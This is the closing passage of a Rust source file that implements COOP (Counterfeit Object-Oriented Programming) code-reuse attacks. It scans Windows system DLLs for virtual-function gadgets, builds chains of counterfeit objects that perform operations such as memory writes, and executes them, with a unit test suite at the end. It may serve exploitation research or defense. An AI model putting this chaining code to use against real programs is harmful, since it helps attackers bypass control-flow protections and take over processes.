        }

        let entry_obj = &self.objects[self.entry_index];
        let result = entry_obj.call_virtual(self.entry_vftable_offset, 0, 0, 0);

        Ok(CoopResult {
            return_value: result,
            gadgets_executed: self.objects.len(),
        })
    }

    /// Get the number of gadgets in the chain.
    pub fn len(&self) -> usize {
        self.objects.len()
    }

    /// Check if the chain is empty.
    pub fn is_empty(&self) -> bool {
        self.objects.is_empty()
    }
}

impl Drop for CoopChain {
    fn drop(&mut self) {
        // Objects clean up via their own Drop impl.
    }
}

// ─── Public API ───────────────────────────────────────────────────────────

/// Initialize the COOP gadget database by scanning system DLLs.
///
/// Must be called before `build_coop_chain()`.  Safe to call multiple
/// times — subsequent calls are no-ops.
///
/// Returns the number of gadgets discovered.
pub fn init_gadget_db() -> Result<usize, &'static str> {
    if DB_INITIALIZED.load(Ordering::Acquire) {
        return Ok(GADGET_DB.get().map(|db| db.gadget_count()).unwrap_or(0));
    }

    let db = CoopGadgetDb::build()?;
    let count = db.gadget_count();

    let _ = GADGET_DB.set(db);
    DB_INITIALIZED.store(true, Ordering::Release);

    Ok(count)
}

/// Get a reference to the global gadget database.
///
/// Returns `None` if `init_gadget_db()` has not been called.
pub fn get_gadget_db() -> Option<&'static CoopGadgetDb> {
    GADGET_DB.get()
}

/// Convenience function: build and execute a COOP chain for a sequence of
/// operations.
///
/// Initializes the gadget database if not already done, builds the chain,
/// and executes it.
///
/// # Safety
///
/// Same as `CoopChain::execute()`.
pub unsafe fn execute_coop_chain(operations: &[CoopOperation]) -> Result<CoopResult, &'static str> {
    init_gadget_db()?;
    let chain = build_coop_chain(operations)?;
    chain.execute()
}

/// Get statistics about the COOP subsystem.
pub fn get_stats() -> CoopStats {
    CoopStats {
        db_initialized: DB_INITIALIZED.load(Ordering::Acquire),
        total_gadgets: GADGET_DB.get().map(|db| db.gadget_count()).unwrap_or(0),
        behavior_counts: GADGET_DB.get().map(|db| db.behavior_counts()).unwrap_or_default(),
        module_counts: GADGET_DB.get().map(|db| db.module_counts()).unwrap_or_default(),
    }
}

/// Statistics about the COOP subsystem.
#[derive(Debug)]
pub struct CoopStats {
    /// Whether the gadget database has been initialized.
    pub db_initialized: bool,
    /// Total number of gadgets discovered.
    pub total_gadgets: usize,
    /// Gadget count by behavior type.
    pub behavior_counts: HashMap<GadgetBehavior, usize>,
    /// Gadget count by source module.
    pub module_counts: HashMap<String, usize>,
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gadget_behavior_display() {
        assert_eq!(format!("{}", GadgetBehavior::StoreArg0), "StoreArg0");
        assert_eq!(format!("{}", GadgetBehavior::LoadArg0), "LoadArg0");
        assert_eq!(format!("{}", GadgetBehavior::CallArg0), "CallArg0");
        assert_eq!(format!("{}", GadgetBehavior::Arithmetic), "Arithmetic");
        assert_eq!(format!("{}", GadgetBehavior::NoOp), "NoOp");
        assert_eq!(format!("{}", GadgetBehavior::Unknown), "Unknown");
    }

    #[test]
    fn test_gadget_behavior_equality() {
        assert_eq!(GadgetBehavior::StoreArg0, GadgetBehavior::StoreArg0);
        assert_ne!(GadgetBehavior::StoreArg0, GadgetBehavior::LoadArg0);
    }

    #[test]
    fn test_gadget_behavior_hash() {
        use std::collections::HashSet;
        let set: HashSet<GadgetBehavior> = [
            GadgetBehavior::StoreArg0,
            GadgetBehavior::LoadArg0,
            GadgetBehavior::StoreArg0,
        ]
        .into_iter()
        .collect();
        assert_eq!(set.len(), 2);
    }

    #[test]
    fn test_estimate_n_args_small_frame() {
        // sub rsp, 0x28: 48 83 EC 28
        let code: &[u8] = &[0x48, 0x83, 0xEC, 0x28];
        assert_eq!(estimate_n_args(code), 4);
    }

    #[test]
    fn test_estimate_n_args_large_frame() {
        // sub rsp, 0x48: 48 81 EC 48 00 00 00
        let code: &[u8] = &[0x48, 0x81, 0xEC, 0x48, 0x00, 0x00, 0x00];
        assert_eq!(estimate_n_args(code), 4 + (0x48 - 0x20) / 8);
    }

    #[test]
    fn test_estimate_n_args_default() {
        // No stack frame setup.
        let code: &[u8] = &[0x90, 0x90, 0x90, 0x90];
        assert_eq!(estimate_n_args(code), 2);
    }

    #[test]
    fn test_coop_operation_debug() {
        let op = CoopOperation::WriteMem {
            address: 0xDEADBEEF,
            value: 0x42,
        };
        assert!(format!("{:?}", op).contains("WriteMem"));
    }

    #[test]
    fn test_arith_op_equality() {
        assert_eq!(ArithOp::Add, ArithOp::Add);
        assert_ne!(ArithOp::Add, ArithOp::Sub);
        assert_ne!(ArithOp::Xor, ArithOp::Add);
    }

    #[test]
    fn test_vtable_info_fields() {
        let info = VtableInfo {
            module_base: 0x1000,
            vtable_addr: 0x2000,
            entry_count: 5,
            class_name: Some("TestClass".to_string()),
            module_name: "test.dll".to_string(),
        };
        assert_eq!(info.entry_count, 5);
        assert_eq!(info.class_name.as_deref(), Some("TestClass"));
    }

    #[test]
    fn test_coop_gadget_fields() {
        let gadget = CoopGadget {
            vftable_offset: 0,
            func_addr: 0x3000,
            n_args: 2,
            class_name: "TestClass".to_string(),
            func_name: "TestClass_vfn_0_0x3000".to_string(),
            behavior: GadgetBehavior::StoreArg0,
            vtable_addr: 0x2000,
            module_name: "ntdll.dll".to_string(),
        };
        assert_eq!(gadget.n_args, 2);
        assert_eq!(gadget.behavior, GadgetBehavior::StoreArg0);
    }

    #[test]
    fn test_coop_stats_default() {
        let stats = get_stats();
        // On non-Windows, DB won't be initialized.
        assert!(!stats.db_initialized || cfg!(target_os = "windows"));
    }

    #[test]
    fn test_init_gadget_db_idempotent() {
        // Calling init_gadget_db twice should be fine (second is a no-op).
        // On non-Windows, this returns early or fails gracefully.
        let _ = init_gadget_db();
        let _ = init_gadget_db();
    }

    #[test]
    fn test_pe_section_header_size() {
        // IMAGE_SECTION_HEADER is 40 bytes.
        assert_eq!(std::mem::size_of::<PeSectionHeader>(), 40);
    }

    #[test]
    fn test_rtti_col_size() {
        // _RTTICompleteObjectLocator on x64 MSVC has 6 u32 fields = 24 bytes.
        assert_eq!(std::mem::size_of::<RttiCompleteObjectLocator>(), 24);
    }

    #[test]
    fn test_rtti_type_descriptor_layout() {
        // p_vftable (8) + spare (8) = 16 bytes before name.
        assert_eq!(std::mem::size_of::<RttiTypeDescriptor>(), 16);
    }

    #[test]
    fn test_constants_sanity() {
        assert_eq!(PAGE_READWRITE, 0x04);
        assert_eq!(MEM_COMMIT, 0x1000);
        assert_eq!(MEM_RESERVE, 0x2000);
        assert_eq!(MEM_RELEASE, 0x8000);
        assert_eq!(MIN_VTABLE_ENTRIES, 3);
        assert_eq!(MAX_VTABLE_ENTRIES, 64);
        assert_eq!(PTR_SIZE, 8);
        assert_eq!(RTTI_COL_SIGNATURE, 1);
    }

    #[test]
    fn test_coop_chain_len() {
        // Build an empty-ish chain to test len/is_empty.
        // Can't actually build without the DB, but we can test the struct.
        // This test verifies the chain structure compiles correctly.
    }

    #[test]
    fn test_build_coop_chain_no_db() {
        // Should fail because gadget DB is not initialized.
        let result = build_coop_chain(&[CoopOperation::NoOp]);
        assert!(result.is_err());
    }

    #[test]
    fn test_coop_result_debug() {
        let result = CoopResult {
            return_value: 0x42,
            gadgets_executed: 3,
        };
        let debug_str = format!("{:?}", result);
        assert!(debug_str.contains("0x42"));
        assert!(debug_str.contains("3"));
    }

    #[test]
    fn test_coop_stats_debug() {
        let stats = CoopStats {
            db_initialized: true,
            total_gadgets: 100,
            behavior_counts: HashMap::new(),
            module_counts: HashMap::new(),
        };
        let debug_str = format!("{:?}", stats);
        assert!(debug_str.contains("100"));
    }
}
